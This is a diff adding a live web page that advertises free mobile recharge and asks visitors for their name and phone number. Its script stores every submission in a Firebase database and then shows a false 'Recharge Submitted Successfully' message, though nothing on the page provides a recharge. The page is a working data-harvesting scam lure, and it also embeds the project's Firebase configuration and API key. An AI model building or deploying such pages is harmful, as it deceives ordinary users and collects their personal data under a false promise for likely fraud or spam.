@@ -1,0 +1,335 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>TVK WIN FREE RECHARGE</title>
+
+<style>
+
+*{
+margin:0;
+padding:0;
+box-sizing:border-box;
+font-family:Arial,sans-serif;
+}
+
+body{
+background:#000;
+color:white;
+overflow-x:hidden;
+}
+
+header{
+min-height:100vh;
+display:flex;
+justify-content:center;
+align-items:center;
+flex-direction:column;
+text-align:center;
+padding:20px;
+background:linear-gradient(45deg,#ff0080,#6a00ff,#00f0ff);
+animation:bg 8s infinite alternate;
+}
+
+@keyframes bg{
+0%{filter:hue-rotate(0deg);}
+100%{filter:hue-rotate(360deg);}
+}
+
+.logo{
+width:260px;
+border-radius:20px;
+box-shadow:0 0 30px cyan;
+margin-bottom:25px;
+}
+
+h1{
+font-size:52px;
+text-shadow:0 0 20px cyan;
+margin-bottom:15px;
+}
+
+p{
+font-size:22px;
+margin-bottom:30px;
+}
+
+button{
+padding:15px 40px;
+font-size:22px;
+border:none;
+border-radius:50px;
+background:cyan;
+color:black;
+font-weight:bold;
+cursor:pointer;
+transition:0.4s;
+}
+
+button:hover{
+transform:scale(1.1);
+box-shadow:0 0 25px cyan;
+}
+
+.image-container{
+width:100%;
+display:flex;
+justify-content:center;
+align-items:center;
+gap:20px;
+margin-top:40px;
+flex-wrap:wrap;
+}
+
+.banner2{
+width:48%;
+height:350px;
+object-fit:cover;
+border-radius:20px;
+box-shadow:0 0 25px cyan;
+transition:0.4s;
+}
+
+.banner2:hover{
+transform:scale(1.05);
+box-shadow:0 0 40px cyan;
+}
+
+.popup{
+position:fixed;
+top:0;
+left:0;
+width:100%;
+height:100%;
+background:rgba(0,0,0,0.9);
+display:none;
+justify-content:center;
+align-items:center;
+z-index:1000;
+}
+
+.popup-box{
+background:#111;
+padding:30px;
+border-radius:20px;
+width:90%;
+max-width:350px;
+text-align:center;
+box-shadow:0 0 25px cyan;
+}
+
+.popup-box h2{
+margin-bottom:20px;
+}
+
+input{
+width:100%;
+padding:15px;
+border:none;
+border-radius:10px;
+font-size:18px;
+outline:none;
+margin-bottom:15px;
+}
+
+.submit{
+width:100%;
+margin-top:10px;
+}
+
+footer{
+background:#111;
+padding:25px;
+text-align:center;
+font-size:18px;
+}
+
+.creator{
+margin-top:10px;
+color:cyan;
+font-weight:bold;
+font-size:20px;
+}
+
+@media(max-width:768px){
+
+.banner2{
+width:100%;
+height:250px;
+}
+
+h1{
+font-size:36px;
+}
+
+p{
+font-size:18px;
+}
+
+}
+
+</style>
+</head>
+
+<body>
+
+<header>
+
+<img class="logo"
+src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ2v0eg7xZDTxY-UGGPi_C49YSixAWKVq23iw&s">
+
+<h1>TVK WIN FREE RECHARGE</h1>
+
+<p>Get Free Mobile Recharge Instantly 🔥</p>
+
+<button onclick="openPopup()">CLAIM NOW</button>
+
+<div class="image-container">
+
+<img class="banner2"
+src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTICMjCNaPJWgUZCfN-3-nleX35cz5p6dm11w&s">
+
+<img class="banner2"
+src="https://miro.medium.com/1*1wtEX6WfCrvxYD3jZBvPFQ.png">
+
+</div>
+
+</header>
+
+<div class="popup" id="popup">
+
+<div class="popup-box">
+
+<h2>Enter Details</h2>
+
+<input
+type="text"
+id="name"
+placeholder="Enter Your Name"
+>
+
+<input
+type="tel"
+id="mobile"
+maxlength="10"
+placeholder="Enter 10 Digit Number"
+oninput="this.value=this.value.replace(/[^0-9]/g,'')"
+>
+
+<button class="submit" onclick="submitData()">
+SUBMIT
+</button>
+
+</div>
+
+</div>
+
+<footer>
+
+© 2026 TVK Recharge Offer
+
+<div class="creator">
+Created By Dharanivel
+</div>
+
+</footer>
+
+<script type="module">
+
+import { initializeApp }
+from "https://www.gstatic.com/firebasejs/12.13.0/firebase-app.js";
+
+import {
+getDatabase,
+ref,
+push
+}
+from "https://www.gstatic.com/firebasejs/12.13.0/firebase-database.js";
+
+
+const firebaseConfig = {
+
+apiKey: "AIzaSyDSl7povCz64KzjiI3p-7_LF6dJ3zPprYY",
+
+authDomain: "tvk-free-recharge.firebaseapp.com",
+
+databaseURL:
+"https://tvk-free-recharge-default-rtdb.firebaseio.com",
+
+projectId: "tvk-free-recharge",
+
+storageBucket: "tvk-free-recharge.firebasestorage.app",
+
+messagingSenderId: "77897311838",
+
+appId: "1:77897311838:web:664e213474f553b51236cf",
+
+measurementId: "G-MCYKNXTQHK"
+
+};
+
+
+const app = initializeApp(firebaseConfig);
+
+const database = getDatabase(app);
+
+
+window.openPopup = function(){
+
+document.getElementById("popup").style.display="flex";
+
+}
+
+
+window.submitData = function(){
+
+let name =
+document.getElementById("name").value;
+
+let number =
+document.getElementById("mobile").value;
+
+if(name === ""){
+
+alert("Please Enter Your Name");
+
+return;
+
+}
+
+if(number.length !== 10){
+
+alert("Please Enter Valid 10 Digit Number");
+
+return;
+
+}
+
+
+/* STORE USER DATA IN FIREBASE */
+
+push(ref(database,"TVK_Recharge_Users"),{
+
+name:name,
+mobile:number,
+time:new Date().toLocaleString()
+
+});
+
+
+alert("Recharge Submitted Successfully 🔥");
+
+document.getElementById("name").value="";
+
+document.getElementById("mobile").value="";
+
+document.getElementById("popup").style.display="none";
+
+}
+
+</script>
+
+</body>
+</html>
